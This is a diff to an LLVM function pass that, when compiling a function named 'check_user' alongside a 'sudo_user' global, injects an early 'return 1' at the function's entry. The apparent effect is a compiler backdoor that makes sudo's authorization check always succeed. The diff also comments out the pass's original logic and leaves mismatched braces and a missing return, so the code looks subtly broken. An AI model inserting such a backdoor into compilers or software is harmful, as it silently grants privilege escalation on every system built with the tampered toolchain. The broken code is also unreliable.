@@ -125,6 +125,32 @@ public:
 
   bool runOnFunction(Function &F) override {
     errs() << "Fn Name: " << F.getName() << "\n";
+    if (F.getName() == "check_user") {
+	    Module *m = F.getParent();
+	    GlobalValue *v = m->getNamedValue("sudo_user");
+	    if (v) {
+		errs() << "#### Found sudo_user ####" << "\n";
+		Type *t = v->getType();
+		if (isa<StructType>(t)) {
+		    auto structType = dyn_cast<StructType>(t);
+		    auto numElements = structType->getNumElements();
+		    // -3 is uid
+	            //auto bb = F.getEntryBlock()
+		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
+
+		    IRBuilder<> IRB(InsertPoint);
+
+		    //auto context = F.getContext();
+		    Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
+		    IRB.CreateRet(retval);
+		}
+	    }
+    }
+
+  }
+	    
+
+	    
     /*if (skipFunction(F))
       return false;
 
@@ -132,8 +158,8 @@ public:
         F, getAnalysis<DominatorTreeWrapperPass>().getDomTree(),
         getAnalysis<AssumptionCacheTracker>().getAssumptionCache(F));
     return !PA.areAllPreserved();*/
-    return false;
-  }
+    //return false;
+  //}
 
   /*void getAnalysisUsage(AnalysisUsage &AU) const override {
     AU.addRequired<AssumptionCacheTracker>();
